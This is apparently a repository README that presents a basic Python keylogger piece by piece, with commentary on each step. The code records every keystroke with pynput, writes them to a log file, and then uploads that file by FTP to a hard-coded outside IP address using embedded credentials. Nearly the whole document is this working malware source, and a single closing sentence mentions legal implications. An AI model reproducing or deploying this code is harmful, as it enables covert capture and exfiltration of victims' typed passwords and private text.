# keylogger
Attempting to create a basic keylogger script in Python. 


1. **Import Libraries:**
   ```python
   from pynput.keyboard import Key, Listener
   import ftplib
   import logging
   ```
   - This code snippet imports the necessary libraries:
     - `pynput.keyboard`: Provides functions to monitor and control input devices such as keyboards.
     - `ftplib`: Provides FTP protocol client functionalities.
     - `logging`: Allows logging messages to a file.

2. **Define Variables:**
   ```python
   logdir = ""
   ```
   - This variable `logdir` is an empty string. It's intended to specify the directory where the log file will be saved. You can set it to a specific directory if desired.

3. **Configure Logging:**
   ```python
   logging.basicConfig(filename=logdir + "klog-res.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
   ```
   - This sets up the logging configuration. It specifies the file name (`klog-res.txt`), the logging level (`DEBUG`), and the format of log messages.

4. **Define Functions:**
   ```python
   def pressing_key(key):
       try:
           logging.info(str(key))
       except AttributeError:
           print("A special key {0} has been pressed.".format(key))

   def releasing_key(key):
       if key == Key.esc:
           return False
   ```
   - These functions are called when a key is pressed (`pressing_key`) and released (`releasing_key`). 
   - `pressing_key` logs the pressed key using `logging.info`. It also handles special keys.
   - `releasing_key` checks if the pressed key is the escape key (`Key.esc`). If it is, it returns `False`.

5. **Start Listening for Key Presses:**
   ```python
   print("\nStarted listening...\n")
   with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
       listener.join()
   ```
   - This code block starts listening for key presses. It prints a message indicating that key listening has started.
   - The `Listener` object is created with `pressing_key` and `releasing_key` functions as callbacks.
   - The `join()` method waits for the listener to stop (which is controlled by `releasing_key` returning `False`).

6. **FTP Connection and File Transfer:**
   ```python
   print("\nConnection to the FTP and Sending the data...")
   sess = ftplib.FTP("192.169.68.145", "mafadmin", "msfadin")
   file = open("klog-res.txt", "rb")
   sess.storbinary("STOR klog-res.txt", file)
   file.close()
   sess.quit()
   ```
   - After key listening stops, this block establishes an FTP connection to a server (`192.169.68.145`) using credentials (`mafadmin` and `msfadin`).
   - It then opens the log file in binary read mode (`"rb"`) and uploads it to the server using `storbinary`.
   - Finally, it closes the file and quits the FTP session.

This code snippet essentially creates a keylogger that logs pressed keys to a file (`klog-res.txt`). After logging, it transfers this file via FTP to a specified server. However, please be aware that keyloggers can have ethical and legal implications, and their use should comply with applicable laws and regulations.
